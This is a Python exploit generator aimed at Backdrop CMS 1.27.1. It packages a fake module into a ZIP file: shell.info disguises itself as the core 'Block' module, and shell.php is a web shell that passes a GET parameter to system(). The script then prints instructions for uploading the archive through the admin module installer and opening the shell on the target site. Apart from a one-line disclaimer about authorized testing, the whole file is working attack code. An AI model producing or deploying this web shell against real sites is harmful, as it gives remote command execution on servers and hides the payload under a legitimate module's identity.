#!/usr/bin/env python3
"""
Backdrop CMS Exploit Module Generator
--------------------------------------

This script generates a ZIP archive that contains a Backdrop CMS module with
a web shell. The module includes two files:
  - shell.info: Module metadata.
  - shell.php: A PHP script that accepts a command via GET parameter and executes it.
"""

import os
import time
import zipfile
import argparse
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)


def create_files(shell_dir: str = "shell") -> tuple[str, str]:
    """
    Create the module files (shell.info and shell.php) for Backdrop CMS.

    Args:
        shell_dir (str): Directory where the module files will be created.

    Returns:
        tuple[str, str]: Paths to the created shell.info and shell.php files.
    """
    # Content for the module metadata file.
    info_content = (
        "type = module\n"
        "name = Block\n"
        "description = Controls the visual building blocks a page is constructed with. "
        "Blocks are boxes of content rendered into an area, or region, of a web page.\n"
        "package = Layouts\n"
        "tags[] = Blocks\n"
        "tags[] = Site Architecture\n"
        "version = BACKDROP_VERSION\n"
        "backdrop = 1.x\n\n"
        "configure = admin/structure/block\n\n"
        "; Added by Backdrop CMS packaging script on 2024-03-07\n"
        "project = backdrop\n"
        "version = 1.27.1\n"
        "timestamp = 1709862662\n"
    )

    # Ensure the target directory exists.
    shell_info_path = os.path.join(shell_dir, "shell.info")
    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)

    try:
        with open(shell_info_path, "w", encoding="utf-8") as file:
            file.write(info_content)
    except OSError as e:
        logger.error("Failed to write file %s: %s", shell_info_path, e)
        raise

    # Content for the web shell PHP file.
    shell_content = (
        "<html>\n"
        "<body>\n"
        "<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n"
        "  <input type=\"text\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n"
        "  <input type=\"submit\" value=\"Execute\">\n"
        "</form>\n"
        "<pre>\n"
        "<?php\n"
        "if (isset($_GET['cmd'])) {\n"
        "    system($_GET['cmd']);\n"
        "}\n"
        "?>\n"
        "</pre>\n"
        "</body>\n"
        "</html>\n"
    )

    shell_php_path = os.path.join(shell_dir, "shell.php")
    try:
        with open(shell_php_path, "w", encoding="utf-8") as file:
            file.write(shell_content)
    except OSError as e:
        logger.error("Failed to write file %s: %s", shell_php_path, e)
        raise

    return shell_info_path, shell_php_path


def create_zip(info_path: str, php_path: str, zip_filename: str = "shell.zip") -> str:
    """
    Create a ZIP archive containing the module files.

    Args:
        info_path (str): Path to the shell.info file.
        php_path (str): Path to the shell.php file.
        zip_filename (str): The name of the output ZIP archive.

    Returns:
        str: The filename of the created ZIP archive.
    """
    try:
        with zipfile.ZipFile(zip_filename, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:
            # Store files with their relative paths in the archive.
            zipf.write(info_path, arcname=os.path.join("shell", "shell.info"))
            zipf.write(php_path, arcname=os.path.join("shell", "shell.php"))
    except zipfile.BadZipFile as e:
        logger.error("Failed to create ZIP file %s: %s", zip_filename, e)
        raise

    return zip_filename


def main(url: str) -> None:
    """
    Generate the exploit module and print installation instructions.

    Args:
        url (str): The base URL of the target Backdrop CMS installation.
    """
    logger.info("Backdrop CMS 1.27.1 - Remote Command Execution Exploit Generator")

    try:
        info_path, php_path = create_files()
        zip_filename = create_zip(info_path, php_path)
    except Exception as error:
        logger.error("An error occurred during file generation: %s", error)
        return

    logger.info("Module generated successfully: %s", zip_filename)
    time.sleep(2)

    # Display installation instructions.
    instructions = (
        f"Installation Instructions:\n"
        f"1. Navigate to: {url}/admin/modules/install\n"
        f"2. Upload the generated archive: {zip_filename}\n"
        f"3. After installation, access your shell at: {url}/modules/shell/shell.php\n"
    )
    logger.info(instructions)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generate a malicious Backdrop CMS module archive with a web shell. "
                    "For authorized testing and educational purposes only."
    )
    parser.add_argument("url", type=str, help="Base URL of the target Backdrop CMS site (e.g., http://example.com)")
    args = parser.parse_args()
    main(args.url)
